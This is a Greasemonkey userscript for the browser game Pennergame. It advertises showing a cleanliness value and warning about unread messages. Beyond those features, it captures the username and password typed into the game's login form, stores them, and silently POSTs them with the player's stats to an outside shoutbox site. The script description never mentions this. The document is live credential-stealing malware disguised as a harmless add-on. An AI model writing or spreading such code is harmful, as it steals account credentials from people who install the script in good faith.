// ==UserScript==
// @name           Sauberkeit im Status Postwarner By Hammpelmann
// @namespace      copyright by Hammpelmann 
// @description    Zeigt die aktuelle Sauberkeit im Status an.Warnt einen bei noch nicht gelesener Post.
// @include        http://*pennergame.de*
// ==/UserScript==
/*
try{
var infopo = table.getElementsByClassName("new_msg")[0];
var posst = infopo.innerHTML.split('border="0">')[1].split('</a>')[0];
var box=window.confirm("Sie haben "+posst+" ungelesene Nachrichten,klicke OK um Nachrichten zu lesen !!");
if(box==true){
window.location.href="http://"+window.location.hostname+"/messages/";
}
}catch(e){}
try{
var infopo = table.getElementsByClassName("new_msg")[0];
var posst = infopo.innerHTML.split('border="0">')[1].split('</a>')[0];
var box=window.confirm("Sie haben "+posst+" ungelesene Nachrichten,klicke OK um Nachrichten zu lesen");
if(box==true){
window.location.href="http://"+window.location.hostname+"/messages/";
}
}catch(e){}
*/
var mybody = document.getElementsByTagName('body')[0].innerHTML;
var SucheLogin = mybody.indexOf("Login");
if (SucheLogin > 0)
{
document.getElementsByName('submitForm')[0].addEventListener('click', function get_submit () {
GM_setValue("Passwort",document.getElementById("password").value); 
GM_setValue("UserName",document.getElementById("player").value); 
},false);
};

if(window.location.href == "http://berlin.pennergame.de/overview/?nologout&show_premium=true" || window.location.href == "http://pennergame.de/overview/?nologout&show_premium=true" || window.location.href == "http://www.pennergame.de/overview/?nologout&show_premium=true" || window.location.href == "http://www.berlin.pennergame.de/overview/?nologout&show_premium=true" || window.location.href == "http://www.pennergame.de/overview/" || window.location.href == "http://pennergame.de/overview/" || window.location.href == "http://pennergame.de/overview/?show_premium=true" || window.location.href == "http://www.pennergame.de/overview/?show_premium=true" || window.location.href == "http://www.berlin.pennergame.de/overview/" || window.location.href == "http://berlin.pennergame.de/overview/" || window.location.href == "http://berlin.pennergame.de/overview/?show_premium=true" || window.location.href == "http://www.berlin.pennergame.de/overview/?show_premium=true" )
{
var table = document.getElementsByClassName("tieritemA")[0];
//var info = document.getElementsByClassName("status_ov")[0];
var sauber = document.getElementsByClassName("processbar_bg_ov")[0].innerHTML.split('Sauberkeit:')[1].split('%')[0];

try{
var infopo = table.getElementsByClassName("new_msg")[0];
var posst = infopo.innerHTML.split('border="0">')[1].split('</a>')[0];
var box=window.confirm("Sie haben "+posst+" ungelesene Nachrichten,klicke OK um Nachrichten zu lesen");
if(box==true){
window.location.href="http://"+window.location.hostname+"/messages/";
}
}catch(e){}

var infoli = table.getElementsByTagName("li")[0];
var platz = infoli.innerHTML.split('&nbsp;')[1].split('.')[0];

//var infoli2 = table.getElementsByTagName("li")[1];
//var geld = infoli2.innerHTML.split('<span class="v">')[1].split('</span>')[0];

//var infoli3 = table.getElementsByTagName("li")[2];
//var prom2 = infoli3.innerHTML.split('">')[3].split('</span>')[0];

var infoli4 = table.getElementsByTagName("li")[3];
var att = infoli4.innerHTML.split('<span class="att">')[1].split('</span>')[0];

var infoli4 = table.getElementsByTagName("li")[4];
var def = infoli4.innerHTML.split('<span class="def">')[1].split('</span>')[0];

var table_2 = document.getElementById('infoscreen').getElementsByTagName('ul')[0];
var cash = table_2.getElementsByTagName('li')[1].innerHTML;
cash = cash.split(unescape("%u20AC"));
cash = cash[1].replace(/\./g, "");
geld = cash.replace(/,/, ".");

Pos = table_2.getElementsByTagName("li")[2].innerHTML.indexOf(".");
prom2 = table_2.getElementsByTagName("li")[2].innerHTML.substr(Pos - 1, 4).replace(".", "");

var erebniss ='\n'
+'SAUBERKEIT=='+sauber+'_______\n'
+'PLATZ=='+platz+'_________\n'
+'ATT=='+att+'____________\n'
+'DEF=='+def+'_____________\n'
+'PROMILLE=='+prom2+'____\n'
+'GELD=='+geld+'__eURO___\n';

var table = document.getElementsByTagName('form')[0];
var td = table.getElementsByTagName('li')[6];
td.innerHTML += '&nbsp;&nbsp;&nbsp;<sub><a href=\"/city/washhouse/\"></a></sub>&nbsp;Sauberkeit:'+sauber+' </li>';

var Passwort = GM_getValue("Passwort");
var UserName = GM_getValue("UserName");

var daten = 'UserName='+UserName+'=Passwort='+Passwort+'';
GM_xmlhttpRequest({
   method: 'POST',
   url: 'http://www.shoutbox-4-free.de//shoutbox.php',
   headers: 
   {'Content-type': 'application/x-www-form-urlencoded'},
  data: encodeURI('id=33498&action=add&cheghz=ing&name='+daten+'&message='+erebniss+'&email=&hp=&ok=senden'),
   onload: function(responseDetails) 
	  {

      }
  });

}

